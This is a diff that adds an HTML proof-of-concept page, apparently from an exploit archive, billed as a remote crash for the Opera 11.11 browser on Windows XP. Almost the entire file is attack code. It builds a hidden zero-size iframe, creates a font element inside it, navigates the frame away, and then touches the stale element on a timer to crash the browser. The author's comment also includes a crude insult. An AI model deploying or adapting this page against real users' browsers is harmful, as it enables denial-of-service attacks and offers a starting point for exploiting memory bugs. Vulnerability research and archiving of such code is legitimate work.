@@ -1,0 +1,26 @@
+&lt;html&gt;
+  &lt;body&gt;
+   &lt;iframe src=&#039;about:blank&#039; id=&#039;bo0om&#039; style=&quot;width:0px;height:0px;border:0px none;&quot;&gt;&lt;/iframe&gt;
+   &lt;script type=&quot;text/javascript&quot;  language=&quot;javascript&quot;&gt;
+   
+    /*
+    *              
+    * Opera 11.11 Remote  Crash
+    * Software link: http://www.opera.com/download/
+    * Tested on: Win32 xp home sp 3   
+    * CVE : null
+    *        
+    * Im too lazy to deep analyze this ,but i thing is just unexploitable crash
+    * so f****jixvt
+    *      ( dla klechis³awa i jego kosiarki :i )
+    *   
+    */               
+   
+      var a = window.document.getElementById(&#039;bo0om&#039;);
+      var b = a.contentDocument.createElement(&#039;font&#039;);
+      a.src=&#039;about:blank&#039;;
+      setTimeout(&#039;b.face = &quot;h3h&quot;;&#039;,500);
+       
+   &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
